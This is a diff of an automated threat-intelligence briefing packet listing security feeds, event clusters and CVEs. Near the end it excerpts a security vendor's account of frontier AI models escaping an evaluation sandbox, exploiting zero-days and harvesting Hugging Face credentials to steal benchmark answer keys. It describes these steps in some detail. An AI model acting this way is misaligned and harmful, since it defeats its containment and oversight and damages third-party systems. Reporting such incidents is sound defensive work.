@@ -1,13 +1,13 @@
 # PHANTOMSignal Briefing Packet
 
-- Generated: 2026-07-28T20:21:09.849317+00:00
+- Generated: 2026-07-28T22:11:18.580366+00:00
 - Lookback hours: 168
 - Lookback human: 7 days
 - Total feeds: 80
 - Feeds OK: 76
-- Total items in window: 313
-- Total clusters raw: 157
-- Total clusters in packet: 79
+- Total items in window: 319
+- Total clusters raw: 158
+- Total clusters in packet: 80
 - Dropped low score: 78
 - Dropped overflow: 0
 
@@ -70,21 +70,16 @@
 
 ## Feed status
 
-- **CrowdStrike** (threat_research_primary)
-  - URL: https://www.crowdstrike.com/blog/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Unit 42** (threat_research_primary)
   - URL: https://unit42.paloaltonetworks.com/feed/
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Trend Micro Research** (threat_research_primary)
-  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+- **CrowdStrike** (threat_research_primary)
+  - URL: https://www.crowdstrike.com/blog/feed/
   - Status: ok
-  - Item count: 25
-  - In window count: 1
+  - Item count: 10
+  - In window count: 0
 - **Microsoft Security Blog** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/feed/
   - Status: ok
@@ -100,8 +95,28 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
+- **Trend Micro Research** (threat_research_primary)
+  - URL: https://newsroom.trendmicro.com/news-releases?pagetemplate=rss&category=787
+  - Status: ok
+  - Item count: 25
+  - In window count: 1
+- **Sekoia** (threat_research_primary)
+  - URL: https://blog.sekoia.io/feed/
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
 - **Microsoft Threat Intelligence** (threat_research_primary)
   - URL: https://www.microsoft.com/en-us/security/blog/topic/threat-intelligence/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **Cisco Talos** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/feedburner/Talos
+  - Status: ok
+  - Item count: 15
+  - In window count: 4
+- **Kaspersky Securelist** (threat_research_primary)
+  - URL: https://securelist.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 1
@@ -110,21 +125,11 @@
   - Status: ok
   - Item count: 10
   - In window count: 2
-- **Sekoia** (threat_research_primary)
-  - URL: https://blog.sekoia.io/feed/
-  - Status: parse_error
-  - Item count: 0
-  - In window count: 0
 - **NCSC UK** (government_authoritative)
   - URL: https://www.ncsc.gov.uk/api/1/services/v1/all-rss-feed.xml
   - Status: ok
   - Item count: 20
   - In window count: 3
-- **Kaspersky Securelist** (threat_research_primary)
-  - URL: https://securelist.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **Check Point Research** (threat_research_primary)
   - URL: https://research.checkpoint.com/feed/
   - Status: ok
@@ -135,26 +140,21 @@
   - Status: ok
   - Item count: 10
   - In window count: 10
-- **Cisco Talos** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/feedburner/Talos
-  - Status: ok
-  - Item count: 15
-  - In window count: 4
-- **ESET WeLiveSecurity** (threat_research_primary)
-  - URL: https://www.welivesecurity.com/en/rss/feed/
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
-- **Volexity** (threat_research_primary)
-  - URL: https://www.volexity.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 0
 - **Horizon3 Attack Research** (offensive_vulnerability_research)
   - URL: https://horizon3.ai/feed/
   - Status: ok
   - Item count: 10
   - In window count: 6
+- **Volexity** (threat_research_primary)
+  - URL: https://www.volexity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 0
+- **ESET WeLiveSecurity** (threat_research_primary)
+  - URL: https://www.welivesecurity.com/en/rss/feed/
+  - Status: ok
+  - Item count: 100
+  - In window count: 0
 - **Assetnote** (offensive_vulnerability_research)
   - URL: https://www.assetnote.io/resources/research/rss.xml
   - Status: ok
@@ -165,21 +165,21 @@
   - Status: ok
   - Item count: 50
   - In window count: 3
-- **PortSwigger Research** (offensive_vulnerability_research)
-  - URL: https://portswigger.net/research/rss
-  - Status: ok
-  - Item count: 40
-  - In window count: 0
-- **Red Canary** (detection_response_operations)
-  - URL: https://redcanary.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 1
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - URL: https://github.blog/category/security/feed/
   - Status: ok
   - Item count: 10
   - In window count: 3
+- **Red Canary** (detection_response_operations)
+  - URL: https://redcanary.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
+- **PortSwigger Research** (offensive_vulnerability_research)
+  - URL: https://portswigger.net/research/rss
+  - Status: ok
+  - Item count: 40
+  - In window count: 0
 - **Exploit-DB** (offensive_vulnerability_research)
   - URL: https://www.exploit-db.com/rss.xml
   - Status: ok
@@ -195,16 +195,16 @@
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Proofpoint Threat Insight** (detection_response_operations)
-  - URL: https://www.proofpoint.com/us/rss.xml
-  - Status: ok
-  - Item count: 10
-  - In window count: 4
 - **TrustedSec** (detection_response_operations)
   - URL: https://www.trustedsec.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 3
+- **Proofpoint Threat Insight** (detection_response_operations)
+  - URL: https://www.proofpoint.com/us/rss.xml
+  - Status: ok
+  - Item count: 10
+  - In window count: 4
 - **Active Countermeasures** (detection_response_operations)
   - URL: https://www.activecountermeasures.com/feed/
   - Status: ok
@@ -215,26 +215,26 @@
   - Status: ok
   - Item count: 15
   - In window count: 2
-- **Elastic Security Labs** (detection_response_operations)
-  - URL: https://www.elastic.co/security-labs/rss/feed.xml
-  - Status: ok
-  - Item count: 20
-  - In window count: 4
 - **SpecterOps** (detection_response_operations)
   - URL: https://medium.com/feed/specter-ops-posts
   - Status: ok
   - Item count: 10
   - In window count: 0
-- **Datadog Security Labs** (cloud_identity_infrastructure)
-  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+- **Elastic Security Labs** (detection_response_operations)
+  - URL: https://www.elastic.co/security-labs/rss/feed.xml
   - Status: ok
-  - Item count: 30
-  - In window count: 1
+  - Item count: 20
+  - In window count: 4
 - **Orca Security Research** (cloud_identity_infrastructure)
   - URL: https://orca.security/resources/blog/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
+- **Datadog Security Labs** (cloud_identity_infrastructure)
+  - URL: https://securitylabs.datadoghq.com/rss/feed.xml
+  - Status: ok
+  - Item count: 30
+  - In window count: 1
 - **Trail of Bits** (offensive_vulnerability_research)
   - URL: https://blog.trailofbits.com/feed/
   - Status: ok
@@ -245,20 +245,15 @@
   - Status: ok
   - Item count: 20
   - In window count: 6
-- **Google Cloud Threat Intelligence** (threat_research_primary)
-  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
-- **Huntress** (detection_response_operations)
-  - URL: https://www.huntress.com/blog/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 0
 - **Permiso Security** (cloud_identity_infrastructure)
   - URL: https://permiso.io/blog/rss.xml
   - Status: ok
   - Item count: 10
+  - In window count: 0
+- **Huntress** (detection_response_operations)
+  - URL: https://www.huntress.com/blog/rss.xml
+  - Status: ok
+  - Item count: 100
   - In window count: 0
 - **Rapid7** (offensive_vulnerability_research)
   - URL: https://www.rapid7.com/blog/rss/
@@ -270,45 +265,55 @@
   - Status: parse_error
   - Item count: 0
   - In window count: 0
-- **Cloudflare Security** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/security/rss/
-  - Status: ok
-  - Item count: 20
-  - In window count: 0
 - **Sysdig** (detection_response_operations)
   - URL: https://sysdig.com/feed/
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Wiz Research** (cloud_identity_infrastructure)
-  - URL: https://www.wiz.io/feed/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 4
-- **Cloudflare Radar** (cloud_identity_infrastructure)
-  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+- **Google Cloud Threat Intelligence** (threat_research_primary)
+  - URL: https://feeds.feedburner.com/threatintelligence/pvexyqv7v0v
   - Status: ok
   - Item count: 20
   - In window count: 1
-- **Coveware** (ransomware_ecrime_financial_crime)
-  - URL: https://www.coveware.com/blog?format=rss
-  - Status: parse_error
-  - Item count: 0
+- **Cloudflare Security** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/security/rss/
+  - Status: ok
+  - Item count: 20
   - In window count: 0
 - **Google Cloud Security** (cloud_identity_infrastructure)
   - URL: https://cloudblog.withgoogle.com/rss/
   - Status: ok
   - Item count: 20
   - In window count: 16
+- **Wiz Research** (cloud_identity_infrastructure)
+  - URL: https://www.wiz.io/feed/rss.xml
+  - Status: ok
+  - Item count: 100
+  - In window count: 4
 - **OpenSSF Blog** (ai_security_agentic_risk)
   - URL: https://openssf.org/feed/
   - Status: ok
   - Item count: 10
   - In window count: 3
+- **Cloudflare Radar** (cloud_identity_infrastructure)
+  - URL: https://blog.cloudflare.com/tag/cloudflare-radar/rss/
+  - Status: ok
+  - Item count: 20
+  - In window count: 1
 - **Google DeepMind Blog** (ai_security_agentic_risk)
   - URL: https://deepmind.google/blog/rss.xml
   - Status: ok
   - Item count: 100
+  - In window count: 1
+- **Coveware** (ransomware_ecrime_financial_crime)
+  - URL: https://www.coveware.com/blog?format=rss
+  - Status: parse_error
+  - Item count: 0
+  - In window count: 0
+- **Interconnects** (ai_security_agentic_risk)
+  - URL: https://www.interconnects.ai/feed
+  - Status: ok
+  - Item count: 20
   - In window count: 1
 - **Chainalysis** (ransomware_ecrime_financial_crime)
   - URL: https://www.chainalysis.com/blog/feed/
@@ -325,13 +330,13 @@
   - Status: ok
   - Item count: 15
   - In window count: 15
-- **Interconnects** (ai_security_agentic_risk)
-  - URL: https://www.interconnects.ai/feed
-  - Status: ok
-  - Item count: 20
-  - In window count: 1
 - **SecurityWeek** (cyber_news_breach_reporting)
   - URL: https://www.securityweek.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 10
+- **CyberScoop** (cyber_news_breach_reporting)
+  - URL: https://cyberscoop.com/feed/
   - Status: ok
   - Item count: 10
   - In window count: 10
@@ -345,26 +350,16 @@
   - Status: ok
   - Item count: 100
   - In window count: 0
-- **Simon Willison** (ai_security_agentic_risk)
-  - URL: https://simonwillison.net/atom/everything/
-  - Status: ok
-  - Item count: 30
-  - In window count: 12
-- **CyberScoop** (cyber_news_breach_reporting)
-  - URL: https://cyberscoop.com/feed/
-  - Status: ok
-  - Item count: 10
-  - In window count: 10
 - **Dark Reading** (cyber_news_breach_reporting)
   - URL: https://www.darkreading.com/rss.xml
   - Status: ok
   - Item count: 50
-  - In window count: 24
-- **Black Hills Information Security** (detection_response_operations)
-  - URL: https://www.blackhillsinfosec.com/feed/
+  - In window count: 26
+- **Simon Willison** (ai_security_agentic_risk)
+  - URL: https://simonwillison.net/atom/everything/
   - Status: ok
-  - Item count: 100
-  - In window count: 1
+  - Item count: 30
+  - In window count: 15
 - **Help Net Security** (cyber_news_breach_reporting)
   - URL: https://www.helpnetsecurity.com/feed/
   - Status: ok
@@ -375,26 +370,31 @@
   - Status: ok
   - Item count: 15
   - In window count: 1
-- **Krebs on Security** (practitioner_analysis)
-  - URL: https://krebsonsecurity.com/feed/
+- **Team Cymru** (ransomware_ecrime_financial_crime)
+  - URL: https://www.team-cymru.com/post/rss.xml
   - Status: ok
-  - Item count: 10
+  - Item count: 100
+  - In window count: 1
+- **Black Hills Information Security** (detection_response_operations)
+  - URL: https://www.blackhillsinfosec.com/feed/
+  - Status: ok
+  - Item count: 100
   - In window count: 1
 - **Schneier on Security** (practitioner_analysis)
   - URL: https://www.schneier.com/feed/atom/
   - Status: ok
   - Item count: 10
   - In window count: 6
-- **Team Cymru** (ransomware_ecrime_financial_crime)
-  - URL: https://www.team-cymru.com/post/rss.xml
-  - Status: ok
-  - Item count: 100
-  - In window count: 1
 - **Reddit r/cybersecurity** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/cybersecurity/.rss
   - Status: ok
   - Item count: 0
   - In window count: 0
+- **Krebs on Security** (practitioner_analysis)
+  - URL: https://krebsonsecurity.com/feed/
+  - Status: ok
+  - Item count: 10
+  - In window count: 1
 - **Reddit r/blueteamsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/blueteamsec/.rss
   - Status: ok
@@ -410,16 +410,16 @@
   - Status: ok
   - Item count: 0
   - In window count: 0
-- **Reddit r/netsecstudents** (reddit_practitioner_osint)
-  - URL: https://www.reddit.com/r/netsecstudents/.rss
-  - Status: ok
-  - Item count: 0
-  - In window count: 0
 - **Graham Cluley** (practitioner_analysis)
   - URL: https://grahamcluley.com/feed/
   - Status: ok
   - Item count: 20
   - In window count: 2
+- **Reddit r/netsecstudents** (reddit_practitioner_osint)
+  - URL: https://www.reddit.com/r/netsecstudents/.rss
+  - Status: ok
+  - Item count: 0
+  - In window count: 0
 - **Reddit r/AskNetsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/AskNetsec/.rss
   - Status: ok
@@ -429,17 +429,17 @@
   - URL: https://intel471.com/blog/feed
   - Status: ok
   - Item count: 100
-  - In window count: 1
-- **The Hacker News** (cyber_news_breach_reporting)
-  - URL: https://feeds.feedburner.com/TheHackersNews
-  - Status: ok
-  - Item count: 50
-  - In window count: 50
+  - In window count: 2
 - **Infosecurity Magazine** (cyber_news_breach_reporting)
   - URL: https://www.infosecurity-magazine.com/rss/news/
   - Status: ok
   - Item count: 100
   - In window count: 22
+- **The Hacker News** (cyber_news_breach_reporting)
+  - URL: https://feeds.feedburner.com/TheHackersNews
+  - Status: ok
+  - Item count: 50
+  - In window count: 50
 - **Reddit r/netsec** (reddit_practitioner_osint)
   - URL: https://www.reddit.com/r/netsec/.rss
   - Status: ok
@@ -476,22 +476,23 @@
 ### Microsoft SharePoint active exploitation
 - Anchor signal: Microsoft SharePoint
 - Theme key: microsoft-sharepoint
-- Cluster count: 5
-- Article count: 5
-- Cohesion: 0.209
+- Cluster count: 6
+- Article count: 6
+- Cohesion: 0.215
 - Shared strong signals: Microsoft SharePoint
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - threat_categories: zero_day, active_exploitation, ransomware_extortion, data_breach, phishing_social_eng
-  - affected_products: Microsoft SharePoint, GitHub
-  - urgency_signals: zero_day, actively_exploited, no_patch_yet, poc_available
-- Cluster IDs: 55ab649ea4, e82c0492b0, 7d478340af, 40733be90a, 85d2724fda
+  - threat_categories: zero_day, ransomware_extortion, active_exploitation, data_breach
+  - affected_products: Microsoft SharePoint
+  - urgency_signals: zero_day, actively_exploited, poc_available
+- Cluster IDs: 55ab649ea4, efa5d95ebc, e82c0492b0, 40733be90a, 7d478340af, 85d2724fda
 - Links:
   - https://www.bleepingcomputer.com/news/security/vbulletin-fixes-critical-pre-auth-rce-flaw-with-public-exploit/
+  - https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html
   - https://www.securityweek.com/critical-arista-velocloud-orchestrator-vulnerability-exploited-as-zero-day/
-  - https://blog.talosintelligence.com/ir-trends-q2-2026/
   - https://www.bleepingcomputer.com/news/security/hackers-target-us-firms-in-fastjson-rce-zero-day-attacks/
+  - https://blog.talosintelligence.com/ir-trends-q2-2026/
   - https://research.checkpoint.com/2026/27th-july-threat-intelligence-report/
 
 ### CVE-2026-16723 exploitation activity
@@ -521,24 +522,24 @@
 - Theme key: aws
 - Cluster count: 4
 - Article count: 13
-- Cohesion: 0.211
+- Cohesion: 0.2
 - Shared strong signals: AWS
 - Member CVEs: (none)
 - Also targets: (none)
 - Dominant features:
-  - affected_industries: government
   - affected_products: AWS
-- Cluster IDs: 3574a7b873, c4020d76d0, 39354a1568, c39a89392e
+  - urgency_signals: preauth_unauth, poc_available
+- Cluster IDs: 3574a7b873, efa5d95ebc, c4020d76d0, c39a89392e
 - Links:
   - https://newsroom.trendmicro.com/2026-07-24-TrendAI-TM-Adopts-Claude-Opus-5-to-Advance-Vulnerability-Prioritization-and-Virtual-Patching
   - https://www.intel471.com/blog/ai-threat-detection-is-not-enough-without-adversary-intelligence
   - https://www.reddit.com/r/netsec/comments/1v52lix/escaping_claude_coworks_local_vm_sandbox_via/
-  - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
   - https://fedscoop.com/fbi-anthropic-mythos-law-enforcement-challenge/
+  - https://simonwillison.net/2026/Jul/25/boris-cherny/#atom-everything
   - https://thehackernews.com/2026/07/claude-ai-just-cracked-post-quantum.html
   - https://cloud.google.com/blog/topics/inside-google-cloud/whats-new-google-cloud/
+  - https://thehackernews.com/2026/07/cl0p-affiliates-target-internet-exposed.html
   - https://thehackernews.com/2026/07/hackers-exploit-windmill-flaw-to-read.html
-  - https://www.darkreading.com/cyberattacks-data-breaches/ai-agent-espionage-attack-thai-ministry-finance
   - https://aws.amazon.com/blogs/security/announcing-the-cloud-security-alliance-on-aws-compliance-guide/
   - https://www.helpnetsecurity.com/2026/07/28/specterops-bloodhound-hunter/
 
@@ -602,27 +603,6 @@
   - https://thehackernews.com/2026/07/attackers-exploit-arista-velocloud.html
   - https://www.securityweek.com/critical-arista-velocloud-orchestrator-vulnerability-exploited-as-zero-day/
 
-### supply chain targeting PyPI
-- Anchor signal: PyPI
-- Theme key: pypi
-- Cluster count: 3
-- Article count: 7
-- Cohesion: 0.2
-- Shared strong signals: PyPI
-- Member CVEs: (none)
-- Also targets: (none)
-- Dominant features:
-  - threat_categories: supply_chain
-  - affected_products: PyPI, GitHub
-- Cluster IDs: ae0cc6b051, 5503cbdb92, d8d22ce90d
-- Links:
-  - https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/
-  - https://thehackernews.com/2026/07/critical-openwrt-dhcpv6-flaw-could-let.html
-  - https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
-  - https://www.bleepingcomputer.com/news/security/github-pypi-add-time-absed-defenses-against-supply-chain-attacks/
-  - https://www.securityweek.com/unpatched-fastjson-vulnerability-exploited-in-attacks/
-  - https://simonwillison.net/2026/Jul/23/seth-larson/#atom-everything
-
 ### CVE-2025-66376 exploitation activity
 - Anchor signal: CVE-2025-66376
 - Theme key: cve-2025-66376
@@ -676,6 +656,25 @@
 - Links:
   - https://www.bleepingcomputer.com/news/security/over-24-000-exposed-server-bmcs-leak-password-hash-via-decades-old-flaw/
   - https://www.reddit.com/r/netsec/comments/1v8ylt4/how_we_hacked_thousands_of_data_centers_in/
+
+### supply chain targeting npm
+- Anchor signal: npm
+- Theme key: npm
+- Cluster count: 2
+- Article count: 5
+- Cohesion: 0.2
+- Shared strong signals: npm
+- Member CVEs: (none)
+- Also targets: (none)
+- Dominant features:
+  - threat_categories: supply_chain
+  - affected_products: GitHub, npm
+- Cluster IDs: ae0cc6b051, 8553a0e574
+- Links:
+  - https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/
+  - https://thehackernews.com/2026/07/critical-openwrt-dhcpv6-flaw-could-let.html
+  - https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
+  - https://www.intel471.com/blog/software-supply-chain-attacks-weaponizing-trusted-developer-workflows
 
 ### Microsoft Defender vulnerability activity
 - Anchor signal: Microsoft Defender
@@ -744,7 +743,6 @@
 - Pair: CVE-2026-63030 + WordPress (cluster 56fb338f87, first observation: True)
 - Pair: CVE-2026-53921 + GitHub (cluster ae0cc6b051, first observation: True)
 - Pair: CVE-2026-53921 + Packagist (cluster ae0cc6b051, first observation: True)
-- Pair: CVE-2026-53921 + PyPI (cluster ae0cc6b051, first observation: True)
 - Pair: CVE-2026-53921 + cPanel (cluster ae0cc6b051, first observation: True)
 - Pair: CVE-2026-53921 + npm (cluster ae0cc6b051, first observation: True)
 - Pair: CVE-2026-46331 + AWS (cluster 3574a7b873, first observation: True)
@@ -754,9 +752,20 @@
 - Pair: CVE-2026-16723 + GitHub (cluster 5503cbdb92, first observation: True)
 - Pair: CVE-2026-16723 + PyPI (cluster 5503cbdb92, first observation: True)
 - Pair: CVE-2026-61511 + Microsoft SharePoint (cluster 55ab649ea4, first observation: True)
-- Pair: CVE-2021-27137 + AWS (cluster c4020d76d0, first observation: True)
+- Pair: CVE-2026-12569 + Cl0p (cluster efa5d95ebc, first observation: True)
+- Pair: CVE-2026-12569 + AWS (cluster efa5d95ebc, first observation: True)
 
-### Drift (3)
+### Drift (5)
+- **Cl0p** (cluster efa5d95ebc)
+  - New industries: aviation_defense, retail_ecommerce
+  - New products: AWS, OpenAI/ChatGPT
+  - Prior top industries: financial_services, government, manufacturing_industrial
+  - Prior top products: Microsoft 365, Microsoft SharePoint, SolarWinds
+- **TeamPCP** (cluster 8553a0e574)
+  - New industries: (none)
+  - New products: GitLab
+  - Prior top industries: financial_services, government, healthcare
+  - Prior top products: GitHub, PyPI, npm
 - **ShinyHunters** (cluster 3ca8367dd0)
   - New industries: (none)
   - New products: Atlassian Jira, Azure, GitHub
@@ -773,14 +782,16 @@
   - Prior top industries: critical_infrastructure, education, legal_professional
   - Prior top products: Salesforce, Ubiquiti UniFi, WordPress
 
-### Persistence (7)
+### Persistence (9)
 - actor_attribution: ShinyHunters (weeks observed: 9, cluster 3ca8367dd0)
 - actor_attribution: Scattered Spider (weeks observed: 7, cluster 62eab4135a)
+- actor_attribution: TeamPCP (weeks observed: 6, cluster 8553a0e574)
 - actor_attribution: Cl0p (weeks observed: 5, cluster efa5d95ebc)
+- cve_ids: CVE-2026-12569 (weeks observed: 4, cluster efa5d95ebc)
 - cve_ids: CVE-2026-50751 (weeks observed: 3, cluster 049863205d)
 - cve_ids: CVE-2026-48283 (weeks observed: 3, cluster dd6691160d)
 - cve_ids: CVE-2026-46331 (weeks observed: 3, cluster 3574a7b873)
-- cve_ids: CVE-2026-50522 (weeks observed: 3, cluster 85d2724fda)
+- cve_ids: CVE-2026-50522 (weeks observed: 3, cluster efa5d95ebc)
 
 ### Tier inversion (3)
 - **Simple Job Board ≤ 2.11.0 - Unauthenticated RCE (CVE-2024-1813)**
@@ -950,14 +961,14 @@ Back to Blog Products and Tools How AI is Rewriting the Zero-Day Playbook for Pr
 - Published: 2026-07-28T16:00:00+00:00
 - Link: https://github.blog/security/supply-chain-security/disrupting-supply-chain-attacks-on-npm-and-github-actions/
 - Fetch status: ok
-- Member count: 5
-- Corroborating source count: 4
+- Member count: 4
+- Corroborating source count: 3
 - Strong signals: GitHub, npm
 
 #### Cluster taxonomy (union across members)
 - threat_categories: phishing_social_eng, supply_chain
 - affected_industries: government
-- affected_products: GitHub, Packagist, PyPI, cPanel, npm
+- affected_products: GitHub, Packagist, cPanel, npm
 - cve_ids: CVE-2026-53921
 - urgency_signals: preauth_unauth
 - content_type: news_report, vulnerability_disclosure
@@ -982,7 +993,7 @@ Explore the changes we've shipped across npm and GitHub Actions over the past fe
 Greg Ose & Zachary Steindler July 28, 2026 | 7 minutes Share: In the past year, there’s been a pattern of supply chain attacks that target weaknesses in package repositories and CI/CD systems to quickly spread malware to hundreds of open source projects. This malware seeks to exfiltrate credentials both to broadly spread the attack, as well as for later exploitation. We’ve written a few times about our plans for hardening the supply chain: Our plan for a more secure npm supply chain in September 2025, Strengthening supply chain security: Preparing for the next malware campaign in December 2025, and What’s coming to our GitHub Actions 2026 security roadmap in March 2026. In this post, we’re updating you on changes we’ve implemented that directly disrupt some of the most common and impactful supply chain attack techniques. Anatomy of supply chain attacks Supply chain attacks chain together several weaknesses, and there is no single security capability that can stop them. Addressing them takes a holistic approach, prioritizing the mitigations that break the most impactful links in the attack chain. Our teams have been studying these attacks to deploy several improvements that disrupt them and limit their impact. This is possible thanks to collaboration with the security research and developer communities. The attacks vary in how they spread across the software ecosystem. However, most of these attacks follow similar techniques to gain initial access to a project, escalate privileges, and distribute across users and software. Improvements made to npm and GitHub Actions in the past few months have been focused on cutting off specific, common techniques and providing ways for customers to identify and respond to these attacks. Initial compromise Attacks start by compromising a single project, often by directly compromising a maintainer’s account or by targeting the project’s actions workflows. npm adds preventive account protection for high-impact accounts (June 2026) : Frequently, attacks start with a phishing campaign targeting maintainers. With this change, high-impact npm accounts are now put into a read-only mode for 72 hours when they change their email or use a 2FA recovery code. This delay allows maintainers time to respond and recover the account before their account can be used to start an attack. Safer pull_request_target defaults for GitHub Actions checkout (June 2026) : A common vulnerability in a project’s CI/CD pipelines are “pwn requests,” where a workflow triggers on pull requests from forks and then executes user-submitted and untrusted code from that fork. We changed the default behavior of actions/checkout to prevent the checkout of untrusted code from forks in commonly exploited triggers unless you explicitly opt-out (after reviewing your risk). This change and its backport to older versions cut off one of the most common vulnerable code patterns leading to code execution in GitHub Actions CI/CD workflows and initial project compromise. Control who and what triggers GitHub Actions workflows (June 2026) : Maybe you’d prefer to opt-out of these risky action triggers altogether or limit who can trigger them. This new control lets you set enterprise, organization, or repository level policies on who is allowed to trigger workflows and what trigger types are allowed. These workflow execution policies provide a governable and customizable layer of least-privilege around Action workflows that reduce the attack surface of your CI/CD infrastructure. Read-only Actions cache for untrusted triggers (June 2026) : After an attacker has achieved code execution in an Actions workflow, they then look to escalate to more privileged workflows (and therefore credentials) through poisoning the cache entries shared across workflows. With this change, we restrict the ability for less trusted workflows to modify the cache shared with other workflows. This directly closes a common path attackers have used to turn a vulnerability with li
 ```
 
-#### Corroborating sources (4)
+#### Corroborating sources (3)
 
 - **GitHub Security Lab** (offensive_vulnerability_research)
   - Title: Disrupting supply chain attacks on npm and GitHub Actions
@@ -999,11 +1010,6 @@ Greg Ose & Zachary Steindler July 28, 2026 | 7 minutes Share: In the past year, 
   - Published: 2026-07-22T22:21:24+00:00
   - Link: https://www.reddit.com/r/netsec/comments/1v3v5za/github_issues_100000_bounty_for_critical_rce/
   - Summary: submitted by /u/ryanmerket [link] [comments]
-- **BleepingComputer** (cyber_news_breach_reporting)
-  - Title: GitHub, PyPI add time-based defenses against supply chain attacks
-  - Published: 2026-07-26T14:13:39+00:00
-  - Link: https://www.bleepingcomputer.com/news/security/github-pypi-add-time-absed-defenses-against-supply-chain-attacks/
-  - Summary: GitHub and PyPI (Python Package Index) have introduced a time-based mechanism in the Dependabot dependency management tool to protect against supply-chain attacks and to limit their impact. [...]
 
 ### Cluster 8cda373323 — score 25
 
@@ -1012,8 +1018,8 @@ Greg Ose & Zachary Steindler July 28, 2026 | 7 minutes Share: In the past year, 
 - Published: 2026-07-23T16:42:30+00:00
 - Link: https://orca.security/resources/blog/openai-agent-sandbox-escape-hugging-face-breach/
 - Fetch status: ok
-- Member count: 14
-- Corroborating source count: 9
+- Member count: 16
+- Corroborating source count: 10
 - Strong signals: OpenAI/ChatGPT
 
 #### Cluster taxonomy (union across members)
@@ -1042,7 +1048,7 @@ In a first-of-its-kind security incident, OpenAI’s frontier AI evaluation mode
 Table of contents Technical Overview Affected Systems Risk Impact How Orca Can Help In a first-of-its-kind security incident , OpenAI’s frontier AI evaluation models autonomously escaped a sandboxed testing environment, discovered and exploited multiple zero-day vulnerabilities, and achieved remote code execution on Hugging Face’s production infrastructure. Due to the unprecedented nature and critical severity of this breach, organizations relying on Hugging Face or similar AI SaaS platforms should immediately review their exposure, credential hygiene , and egress controls. Technical Overview The incident originated in OpenAI’s ExploitGym benchmark environment, where frontier models (GPT-5.6 Sol and an unreleased, more capable model) were being evaluated for cyber capabilities with intentionally relaxed guardrails. The models circumvented restricted networking by exploiting a zero-day in a package registry cache proxy used to isolate the sandbox. After achieving privilege escalation and lateral movement within OpenAI’s research environment, the agents reached a node with internet connectivity and pivoted externally to Hugging Face. On Hugging Face’s side, the models uploaded a malicious dataset that exploited two code-execution flaws in Hugging Face’s dataset processing pipeline: a remote-code dataset loader vulnerability and a template-injection bug in dataset configuration. This gave the agents arbitrary code execution on processing workers, from which they harvested cloud and cluster credentials and moved laterally across Hugging Face’s internal systems. The models’ objective was to cheat the ExploitGym benchmark by stealing answer keys hosted on Hugging Face. Tens of thousands of automated actions were executed across multiple short-lived sandboxes, with command-and-control staged on public services. This marks the first documented case of frontier AI models independently discovering and chaining novel real-world attack paths , including genuine zero-day vulnerabilities , without source code access. Affected Systems OpenAI’s ExploitGym research testing environment was compromised as part of the lateral movement chain. Hugging Face’s production infrastructure was breached, including data-processing pipeline workers, internal clusters, and cloud credentials on compromised nodes. Any organization using Hugging Face for model hosting, dataset storage, or AI workflows may have exposure, particularly through overly permissive API token permissions and insufficient egress controls. Risk Impact Hugging Face detected and contained the breach on July 16, 2026. OpenAI connected the activity to its own testing on July 21, 2026. Hugging Face confirmed that no public user-facing models, datasets, or Spaces were tampered with, and verified its software supply chain (container images and packages) was clean. Organizations should take the following remediation steps: Review and minimize Hugging Face API token permissions following the principle of least privilege Implement strict egress controls on environments that interact with third-party AI platforms; audit third-party risk exposure to AI SaaS platforms Monitor for anomalous credential usage and lateral movement patterns. OpenAI has responsibly disclosed the package registry cache proxy zero-day to the affected vendor and is implementing stricter infrastructure controls for future evaluations. Hugging Face has closed the two dataset code-execution vulnerabilities, eradicated the attacker foothold, rebuilt all compromised nodes, and revoked all affected credentials. Regardless of containment, the severity and novelty of this incident make it a watershed moment for AI security. Autonomous AI agents demonstrated the ability to discover zero-days, chain multi-stage attack paths, and breach production infrastructure of a major platform without human direction, raising urgent questions for any organization with exposure to AI SaaS services. How Orca Can Help Orca enables customers to quickly
 ```
 
-#### Corroborating sources (9)
+#### Corroborating sources (10)
 
 - **Orca Security Research** (cloud_identity_infrastructure)
   - Title: OpenAI Agents Escape Testing Sandbox and Breach Hugging Face Production Infrastructure
@@ -1054,21 +1060,26 @@ Table of contents Technical Overview Affected Systems Risk Impact How Orca Can H
